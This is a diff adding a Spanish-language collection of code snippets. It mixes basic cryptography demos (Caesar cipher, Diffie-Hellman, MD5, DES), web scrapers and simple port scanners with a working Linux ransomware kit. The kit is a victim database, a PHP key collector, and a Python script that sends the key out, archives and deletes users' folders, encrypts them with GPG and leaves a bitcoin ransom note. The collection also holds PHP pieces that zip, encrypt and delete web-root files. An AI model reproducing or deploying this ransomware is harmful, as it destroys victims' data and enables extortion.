@@ -1,0 +1,807 @@
+cifrado desplazamiento
+-------------------------------------------------------------------------------------
+#!/usr/bin/python 
+# -*- coding: utf-8 -*- 
+
+def cifrar(desplazamiento, texto):
+    texto_cifrado = ""
+    for caracter in texto:
+        texto_cifrado = texto_cifrado + chr(ord(caracter) + desplazamiento)
+    return texto_cifrado
+ 
+texto_original = "Cifrado y descifrado"
+desplazamiento = 3
+ 
+print "Texto Cifrado: " + cifrar(desplazamiento, texto_original)
+print "Texto Descifrado " + cifrar(-desplazamiento, cifrar(desplazamiento, texto_original))
+
+---------------------------------------------------------------------------------------------
+
+Diffie-Hellman
+
+import random
+import base64
+import hashlib
+import sys
+
+g=9
+p=1001
+
+a=random.randint(5, 10)
+b=random.randint(10,20)
+
+A = (g**a) % p
+B = (g**b) % p
+
+print 'g: ',g,' (compartir valores), n: ',p, ' ( numero Primo)'
+
+print '\nACalculo de alicia:'
+print 'a (Alicia random): ',a
+print 'Valor de Alicia (A): ',A,' (g^a) mod p'
+
+print '\nBob calcula :'
+print 'b (Bob random): ',b
+print 'Valor de Bob (B): ',B,' (g^b) mod p'
+
+print '\nAlicia Calcula:'
+keyA=(B**a) % p
+print 'Key: ',keyA,' (B^a) mod p'
+print 'Key: ',hashlib.sha256(str(keyA)).hexdigest()
+
+print '\nBob calcula :'
+keyB=(A**b) % p
+print 'Key: ',keyB,' (A^b) mod p'
+print 'Key: ',hashlib.sha256(str(keyB)).hexdigest()
+
+----------------------------------------------------------------------
+
+md5
+
+from Crypto.Hash import MD5
+m = MD5.new()
+m.update('Hola mundo')
+print m.hexdigest()
+-----------------------------------------------------------------
+
+des
+
+from Crypto.Cipher import DES
+# Como usamos DES, los bloques son de 8 caracteres.
+# Rellenamos con espacios (que habra que eliminar al descifrar).
+usuario =  "John    "
+password = "Lennon  "
+# creamos el cifrador con DES
+cipher = DES.new('12345678')
+# ciframos usuario y password
+c_usuario = cipher.encrypt(usuario)
+c_password = cipher.encrypt(password)
+# enviamos credenciales (a la pantalla en este caso)
+print "El cliente envia:"
+print "Usuario: " + c_usuario
+print "Password: " + c_password
+ 
+#------------------------------------------------------------------
+# a partir de aqui simulamos el servidor donde llegan los mensajes
+# cifrados.
+# desciframos mensajes y quitamos espacios con strip()
+cipher = DES.new('12345678')
+d_usuario = cipher.decrypt(c_usuario).strip()
+d_password = cipher.decrypt(c_password).strip()
+print "El servidor descifra:"
+print "Usuario: " + d_usuario
+print "Password: " + d_password
+
+----------------------------------------------------------------
+
+Ransomware escritorio
+
+
+instalar lo siguiente:
+
+Instalar Servidor Apache:
+sudo apt -get update
+sudo apt -get install apache2
+
+Instalar Servidor Mysql
+sudo apt-get install mysql-server
+
+Instalar PHP5
+sudo apt-get install libapache2-mod-php5 php5 php5-mcrypt php5-mysql
+
+---------------------------------------------------------------
+
+crear base de datos
+
+CREATE DATABASE ransomware_db;
+USE ransomware_db;
+CREATE TABLE victimas (ID int NOT NULL AUTO_INCREMENT,
+                       IDD varchar(35),
+                       PASS varchar(35),
+                       PRIMARY KEY (ID));
+
+
+
+
+php
+
+<?php
+$server = "localhost";
+$username = "root";
+$password = "";
+$dbname = "ransomware_db";
+$pass = (string)$_POST['pass'];
+$id = (string)$_POST['id'];
+$conn = new mysqli($server, $username, $password, $dbname);
+if ($conn->connect_error) {
+    die("Connection failed: " . $conn->connect_error);
+} 
+$sql = "INSERT INTO victimas (IDD, PASS) VALUES ('$id', '$pass');";
+if ($conn->query($sql) === TRUE) {
+    echo "Ok.";
+} else {
+    echo "Error: " . $sql . "<br>" . $conn->error;
+}
+$conn->close();
+?>
+
+
+
+#!/usr/bin/python3
+
+import os
+import sys
+import subprocess
+import random
+import string
+import requests
+import re
+
+def linux():
+	if(os.geteuid() == 0):
+		directories.append('/root/')
+
+	#Genera el password de cifrado
+	s = string.ascii_lowercase + string.digits
+	pwd = str(''.join(random.sample(s, 30)))
+
+	#Genera un ID unico
+	t = string.ascii_lowercase
+	idd = str(''.join(random.sample(t, 10)))
+
+	#se ejecutan las funciones para cifrar los datos
+	sendCred(url, pwd, idd)
+	crypt(directories, pwd)
+	howto(directories, bitcoin, price)
+	decryptGen(str(directories))
+	
+
+def sendCred(url, pwd, idd):
+	values = {'pass' : pwd,'id'	: idd}
+	r = requests.post(url, values)
+	page = r.text
+	if(page != 'Ok.'):
+		sys.exit('Ocurrio un error al enviar las credenciales')
+
+def crypt(directory, pwd):
+		
+		if(type(directory) != list):
+			sys.exit('El formato recibido es incorrecto!')
+
+		for dirr in directory:
+			os.chdir(dirr)
+			os.system('tar cvf encrypted.tar *')
+			os.system('find . ! -name encrypted.tar -type f -delete')
+			os.system('find . ! -name encrypted.tar -type d -delete')
+			os.system('echo ' + pwd + ' | gpg --passphrase-fd 0 -c encrypted.tar')
+                        os.system('rm encrypted.tar')
+                        os.chdir('../')
+                        print "------------------- " 
+
+def howto(directory, bitcoin, price):
+    txt = "\n"
+    txt +="Hola te estaras preguntando Que paso con tus archivos?\n"
+    txt +="todos ellos fueron cifrados con RSA-2048\n"
+    txt +="si los quieres recuperar me debes pagar : """ + str(price) + "\n"
+    txt +="Mi direccion de bitcoins es: " + bitcoin + "\n"
+    txt +="1 bitcoin ~= 240 US $ aproximadamente \n"
+    txt +="Cuando recibas el password usa el archivo decrypt.py\n\n" 
+    txt +="que tengas un lindo dia y mejor suerte para la otra :)\n\n "
+    archivo = open("recuperar-mis-archivos.txt","wb")
+    archivo.write(txt)
+    archivo.close()
+    for dirr in directory:
+        os.system("cp 'recuperar-mis-archivos.txt' " + dirr)
+    
+
+def decryptGen(directory):
+    txt = ""
+    txt +="#!/usr/bin/python3\n"
+    txt +="import os\n"
+    txt +="import sys\n"
+    txt +="directory = " + directory + "\n"
+    txt +="pwd = raw_input('Ingrese el password para decifrar los archivos: ')\n"
+    txt +="for dirr in directory:\n"
+    txt +="    os.chdir(dirr)\n"
+    txt +="    if(os.system('gpg --passphrase ' + pwd + ' -d encrypted.tar.gpg > unencrypted.tar') != 0):\n"
+    txt +="        sys.exit('Password Incorrecto!')\n"
+    txt +="    os.system('tar xvf unencrypted.tar')\n"
+    txt +="    os.system('rm unencrypted.tar')\n"
+    txt +="    os.system('rm encrypted.tar.gpg')\n"
+    txt +="    os.system('rm unencrypted.tar')\n"
+    txt +="    os.system('rm recuperar-mis-archivos.txt')\n"
+    txt +="    os.chdir('../')\n"
+    archivo = open("decrypt.py","wb")
+    archivo.write(txt)
+    archivo.close()
+
+#directorios a cifrar
+directories = ['Documentos','Videos' , 'Descargas' , 'Imagenes' , 'Musica'] 
+bitcoin	= 'aAhR54GVf45FFf3q2kL' #ingresa aqui tu direccion de BitCoin
+price = 3 # Ingresa el monto a pedir
+url = 'http://localhost/datosvictima.php' #ingresa la Url a donde se va enviar el id y password
+
+#verificar que sistema operativo esta detras
+if(sys.platform == 'Linux' or sys.platform == 'linux2'):
+    linux()
+elif(sys.platform == 'Windows'):
+    sys.exit('Soon supported !')
+else:
+    sys.exit('Not supported !')
+
+
+------------------------------------------------------------------------------
+
+python mysql
+
+#!/usr/bin/python
+ 
+import MySQLdb
+ 
+conn = MySQLdb.connect (
+    host = "localhost", 
+    user = "testuser", 
+    passwd =  "testpass", 
+    db = "test")
+ 
+ 
+cursor = conn.cursor ()
+cursor.execute ("SELECT VERSION()")
+row = cursor.fetchone ()
+print "server version:", row[0]
+cursor.close ()
+conn.close ()
+
+--------------------------------------------------------------------------------
+
+
+post http
+
+import requests
+get_response = requests.get(url='http://google.com')
+post_data = {'username':'joeb', 'password':'foobar'}
+# POST some form-encoded data:
+post_response = requests.post(url='http://httpbin.org/post', data=post_data)
+
+--------------------------------------------------------------------------------
+
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+#BeautifulSoup y requests
+ 
+# Importamos las librerias
+from bs4 import BeautifulSoup
+import requests
+ 
+# Capturamos la url ingresada en la variable "url"
+url = raw_input("Ingrese la URL: ")
+ 
+# Capturamos el hml de la pagina web y creamos un objeto Response
+r  = requests.get("http://" +url)
+data = r.text
+print ""
+ 
+# Creamos el objeto soup y le pasamos lo capturado con request
+soup = BeautifulSoup(data, 'lxml')
+ 
+# Capturamos el titulo de la página y luego lo mostramos
+# Lo que hace BeautifulSoup es capturar lo que esta dentro de la etiqueta title de la url
+titulo = soup.title.text
+print "El titulo de la pagina es: " + titulo
+print ""
+ 
+# Buscamos todas etiquetas HTML (a) y luego imprimirmos todo lo que viene despues de "href"
+for link in soup.find_all('a'):
+    print(link.get('href'))
+
+
+-------------------------------------------------------------------------
+
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+ 
+#-----------------------------------------------------------------------------
+# Incluimos los módulos necesarios.
+#-----------------------------------------------------------------------------
+from urllib2 import urlopen
+from BeautifulSoup import BeautifulSoup
+ 
+ 
+# Obtiene el título de una página web.
+def obtener_titulo(url):
+ 
+    # Descargamos la información de la página.
+    soup = BeautifulSoup(urlopen(url))
+ 
+    # Devolvemos únicamente el titulo de la página web.
+    return soup.title.string
+ 
+ 
+# Cuenta las etiquetas divs que aparecen en una página web.
+def contar_divs(url):
+ 
+    # Descargamos la información de la página.
+    soup = BeautifulSoup(urlopen(url))
+ 
+    # Vamos buscando las etiquetas divs.
+    divs = 0
+    for div in soup.findAll("div"):
+        divs += 1
+ 
+    return divs
+ 
+ 
+# El usuario escribe la url
+url = raw_input("url = ")
+ 
+# Mostramos la información obtenida.
+print obtener_titulo(url) + ': ' + str(contar_divs(url)
+
+---------------------------------------------------------------------------
+
+# -*- coding: utf-8 -*-
+__author__ = 'RicardoMoya'
+
+from bs4 import BeautifulSoup
+import requests
+
+URL = "http://jarroba.com/"
+
+# Realizamos la petición a la web
+req = requests.get(URL)
+
+# Comprobamos que la petición nos devuelve un Status Code = 200
+status_code = req.status_code
+if status_code == 200:
+
+    # Pasamos el contenido HTML de la web a un objeto BeautifulSoup()
+    html = BeautifulSoup(req.text, "html.parser")
+
+    # Obtenemos todos los divs donde están las entradas
+    entradas = html.find_all('div', {'class': 'col-md-4 col-xs-12'})
+
+    # Recorremos todas las entradas para extraer el título, autor y fecha
+    for i, entrada in enumerate(entradas):
+        # Con el método "getText()" no nos devuelve el HTML
+        titulo = entrada.find('span', {'class': 'tituloPost'}).getText()
+        # Sino llamamos al método "getText()" nos devuelve también el HTML
+        autor = entrada.find('span', {'class': 'autor'})
+        fecha = entrada.find('span', {'class': 'fecha'}).getText()
+
+        # Imprimo el Título, Autor y Fecha de las entradas
+        print "%d - %s  |  %s  |  %s" % (i + 1, titulo, autor, fecha)
+
+else:
+    print "Status Code %d" % status_code
+
+-----------------------------------------------------------------------------
+
+
+import socket
+
+hosts = ["192.168.1.1", "192.168.2.1", "192.168.2.2", "192.168.2.10"]
+ports = [22, 23, 80, 443, 445, 3389]
+
+for host in hosts:
+    for port in ports:
+        try:
+            print "[+] Connecting to " + host + ":" + str(port)
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(5)
+            result = s.connect_ex((host, port))
+            if result == 0:
+                print "  [*] Port " + str(port) + " open!"
+            s.close()
+        except:
+            pass
+
+------------------------------------------------------------------------------------------
+
+
+nmap de python
+
+import socket
+
+hosts = ["192.168.1.1", "192.168.2.1", "192.168.2.2", "192.168.2.10"]
+ports = [22, 23, 80, 443, 445, 3389]
+
+for host in hosts:
+    for port in ports:
+        try:
+            print "[+] Connecting to " + host + ":" + str(port)
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(5)
+            result = s.connect_ex((host, port))
+            if result == 0:
+                print "  [*] Port " + str(port) + " open!"
+            s.close()
+        except:
+            pass
+
+------------------------------------------------------------------------------------
+
+
+comando cifrar linux
+
+ openssl enc -aes-256-cbc -salt -in file.txt -out file.txt.enc
+
+
+-------------------------------------------------------------------------------------------
+bootstrap
+
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1"> <!–Con esto garantizamos que se vea bien en dispositivos móviles–>
+    <title>Mi primer proyecto con Booststrap</title>
+ 
+    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap.min.css" rel="stylesheet" media="screen"> <!–Llamamos al archivo CSS a través de CDN –>
+  </head>
+  <body>
+    <h1>¡Hola mundo!</h1>
+ 	<p> Hola a todos desde OpenWebinars.net, mi primera web con Bootsrap ;(</p>	
+    
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script> <!– Importante llamar antes a jQuery para que funcione bootstrap.min.js   –> 
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/js/bootstrap.min.js"></script> <!– Llamamos al JavaScript  a través de CDN –>
+  </body>
+</html>  
+
+---------------------------------------------------------------------------------
+exec() - Ejecutar un programa externo
+escapeshellcmd() - Escapar meta-caracteres del intérprete de comandos
+passthru() - Ejecuta un programa externo y muestra la salida en bruto
+popen() - Abre un proceso de un puntero a un fichero
+shell_exec() — Ejecutar un comando mediante el intérprete de comandos y devolver la salida completa como una cadena
+
+<?php
+$salida = shell_exec('ls -lart');
+echo "<pre>$salida</pre>";
+?>
+
+---------------------------------------------------------------------------------
+
+CREATE USER 'newuser'@'localhost' IDENTIFIED BY 'password';
+GRANT ALL PRIVILEGES ON * . * TO 'newuser'@'localhost';
+FLUSH PRIVILEGES;
+
+
+<?php
+$server = "localhost";
+$username = "newuser";
+$password = "password";
+$dbname = "joomla";
+
+// Create connection
+$conn = new mysqli($server, $username, $password, $dbname);
+// Check connection
+if ($conn->connect_error) {
+    die("Connection failed: " . $conn->connect_error);
+}
+
+$sql = "SELECT SESSION_USER() as u , CURRENT_USER() as b;";
+$result = $conn->query($sql);
+
+if ($result->num_rows > 0) {
+    // output data of each row
+        while($row = $result->fetch_assoc()) {
+        echo "id: <br>", $row["u"];
+        echo "id: <br>", $row["b"];
+    }
+} else {
+    echo "0 results";
+}
+$conn->close();
+?>
+----------------------------------------------------------------------------------------------
+otro ejemplo escaneo puertos
+# -*- coding: utf-8 -*-
+import socket
+import urllib2  
+
+def Verificar_Puerto(ip, puerto, timeout=3):
+    socket.setdefaulttimeout(timeout)
+    con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    result = con.connect((ip,puerto))
+    try:
+        desc = con.recv(2048)
+        print "Port " + str(puerto) + "  Open   " + str(desc)
+    except:       
+        print "Port {}:   Open".format(puerto)
+    finally:
+        con.close()
+    
+
+Verificar_Puerto("192.168.1.142", 21)
+Verificar_Puerto("192.168.1.142", 22)
+Verificar_Puerto("192.168.1.142", 23)
+Verificar_Puerto("192.168.1.142", 25)
+Verificar_Puerto("192.168.1.142", 80)
+Verificar_Puerto("192.168.1.142", 3306)
+
+-----------------------------------------------------------------------------------------------
+
+scrapear
+
+from bs4 import BeautifulSoup
+import requests
+
+
+r = requests.get("http://toolbar.netcraft.com/site_report?url=www.ucen.cl")
+html = BeautifulSoup(r.text,"lxml")
+tabla = html.find('table')
+for col in tabla.findAll("tr"):
+    a = col.findAll("td")[0].getText()
+    b = col.findAll("td")[1].getText()
+    print "" + a +  " : " + b
+
+--------------------------------------------------------------------------------------------
+
+
+listar directorios web
+
+<?php
+
+$base_url = __DIR__;
+$directorio = opendir($base_url); 
+
+while ($archivo = readdir($directorio)) 
+{
+    if (is_dir($archivo))//verificamos si es o no un directorio
+    {
+        echo "[".$archivo . "]<br />"; //de ser un directorio lo envolvemos entre corchetes
+    }
+    else
+    {
+        echo $archivo . "<br />";
+    }
+}
+
+
+?>
+
+segundo ejemplo de listar directorio raiz
+
+<?php
+error_reporting(E_ALL);
+ini_set("display_errors", 1);
+
+function List_dir_archiv($ruta){
+$rep = opendir($ruta);//Abrimos el directorio
+while ($arc = readdir($rep)) {//Recorremos el array
+ if($arc != '..' && $arc != '.' && $arc != ''){
+        if(is_dir($ruta."/".$arc)){
+          echo ">> ".$ruta."/".$arc."<br>";
+        }else{
+          echo $ruta."/".$arc."<br>";
+        }    
+ }
+}
+closedir($rep);//Cerramos el directorio
+clearstatcache(); //Limpia la caché de estado de un archivo
+}
+
+$doc_root  = preg_replace("!${_SERVER['SCRIPT_NAME']}$!", '', $_SERVER['SCRIPT_FILENAME']);
+List_dir_archiv($doc_root);
+
+---------------------------------------------------------------------------------------------
+
+verificar librerias para cifrar
+
+<?php
+error_reporting(E_ALL);
+ini_set("display_errors", 1);
+function Verificar_Librerias(){
+ if (!extension_loaded('zip')){
+  echo "Ups, que mala suerte, No se puede usar este programa! <br>";
+  echo "No esta cargada la extencion Zip <br>";
+  echo "Se intentara cargar la libreria zip a la fuerza...<br>";
+     if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
+        dl('php_zip.dll');
+     } else {
+        dl('zip.so');
+     }
+ }elseif (!extension_loaded('mcrypt')){
+  echo "Ups, que mala suerte, No se puede usar este programa! <br>";
+  echo "No esta cargada la extencion mcrypt <br> ";
+  echo "Se intentara cargar la libreria mcrypt a la fuerza...<br>";
+      if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
+        dl('php_mcrypt.dll');
+     } else {
+        dl('mcrypt.so');
+     }
+ }else{
+  echo "Buenas Noticias, este script puede ser usado en este servidor :)";
+ }
+}
+
+Verificar_Librerias();
+
+?>
+
+---------------------------------------------------------------------------------------
+
+comprimir archivos del directorio raiz
+
+<?php
+error_reporting(E_ALL);
+ini_set("display_errors", 1);
+
+$zip = new ZipArchive();
+ 
+$filename = 'test.zip';
+ 
+if($zip->open($filename,ZIPARCHIVE::CREATE)===true) {
+        $zip->addFile('a.txt');
+        $zip->addFile('b.txt');
+        echo 'Creado '.$filename;
+        
+}
+else {
+        echo 'Error creando '.$filename;
+}
+ $zip->close()
+?>
+
+
+ejemplo 2
+
+
+
+
+<?php
+error_reporting(E_ALL);
+ini_set("display_errors", 1);
+
+$base_dir = __DIR__;
+$doc_root  = preg_replace("!${_SERVER['SCRIPT_NAME']}$!", '', $_SERVER['SCRIPT_FILENAME']);
+$base_url  = preg_replace("!^${doc_root}!", '', $base_dir);
+$dir = opendir($doc_root);
+print "<> ". $base_dir . "<br>";
+print "<> ". $doc_root . "<br>";
+print "<> ". $base_url . "<br>";
+$zip = new ZipArchive();
+$filename = $doc_root.'/test.zip';
+print "Guardar en: " . $filename ."<br><br>";
+$acum = array();
+
+while ($archivo = readdir($dir)) 
+{
+    if($zip->open($filename,ZIPARCHIVE::CREATE)===true) {
+      if (is_dir($doc_root."/".$archivo)){ $zip->addFile($doc_root."/".$archivo); }
+      else { $zip->addFile( $doc_root."/".$archivo); }
+    }else {
+        echo 'Error al crear '. $doc_root."/".$archivo;
+     }
+}
+
+
+$zip->close();
+
+echo "---------------------<br>";
+
+?>
+-------------------------------------------------------------------------------------------------------
+
+
+cifrar y descifrar archivos comprimidos
+
+function encrypt_file($source,$destination,$passphrase,$stream=NULL) {
+	// $source can be a local file...
+	if($stream) {
+		$contents = $source;
+	// OR $source can be a stream if the third argument ($stream flag) exists.
+	}else{
+		$handle = fopen($source, "rb");
+		$contents = fread($handle, filesize($source));
+		fclose($handle);
+	}
+ 
+	$iv = substr(md5("\x1B\x3C\x58".$passphrase, true), 0, 8);
+	$key = substr(md5("\x2D\xFC\xD8".$passphrase, true) . md5("\x2D\xFC\xD9".$passphrase, true), 0, 24);
+	$opts = array('iv'=>$iv, 'key'=>$key);
+	$fp = fopen($destination, 'wb') or die("Could not open file for writing.");
+	stream_filter_append($fp, 'mcrypt.tripledes', STREAM_FILTER_WRITE, $opts);
+	fwrite($fp, $contents) or die("Could not write to file.");
+	fclose($fp);
+ 
+}
+
+function decrypt_file($file,$passphrase,$fp_salida){
+ 
+	$iv = substr(md5("\x1B\x3C\x58".$passphrase, true), 0, 8);
+	$key = substr(md5("\x2D\xFC\xD8".$passphrase, true) .
+	md5("\x2D\xFC\xD9".$passphrase, true), 0, 24);
+	$opts = array('iv'=>$iv, 'key'=>$key);
+	$fp = fopen($file, 'rb');
+	stream_filter_append($fp, 'mdecrypt.tripledes', STREAM_FILTER_READ, $opts);
+        $contents = stream_get_contents($fp);
+        $file = fopen($fp_salida, 'wb') or die("No se pudo crear el archivo.");
+        fwrite($file, $contents) or die("No se pudo escribir el archivo.");
+        fclose($fp);
+        fclose($fp_salida);
+}
+
+$fp = "/var/www/html/xas/b/c/compressed2.zip";
+$des ="/var/www/html/xas/b/c/compressed.enc.txt";
+$passphrase ="1234567";
+//encrypt_file($fp,$des,$passphrase);
+decrypt_file($des,$passphrase,$fp);
+
+
+$zip = new ZipArchive;
+if ($zip->open($fp) === TRUE) {
+    $zip->extractTo('/var/www/html/xas/b/c/new/');
+    $zip->close();
+    unlink($des);
+    unlink($fp);
+    echo 'Felicitaciones, ya recuperaste tus archvos :)';
+} else {
+    echo 'La clave es incorrecta!';
+    unlink($fp);
+}
+
+
+
+
+
+
+
+?>
+
+-----------------------------------------------------------------------------------------
+
+eliminar archivos 
+
+
+<?php
+error_reporting(E_ALL);
+ini_set("display_errors", 1);
+
+function EliminarDirectory($dir) {
+ 
+    if(!$dh = @opendir($dir)) return;
+    while (false !== ($current = readdir($dh))) {
+        if($current != '.' && $current != '..') {
+            echo 'Se ha borrado el archivo '.$dir.'/'.$current.'<br/>';
+            if (!@unlink($dir.'/'.$current)) 
+                deleteDirectory($dir.'/'.$current);
+        }       
+    }
+    closedir($dh);
+    echo 'Se ha borrado el directorio '.$dir.'<br/>';
+    @rmdir($dir);
+ 
+}
+
+//$doc_root  = preg_replace("!${_SERVER['SCRIPT_NAME']}$!", '', $_SERVER['SCRIPT_FILENAME']);
+EliminarDirectory('/var/www/html/prueba');
+
+?>
+
+
+
+
+
+
+
+
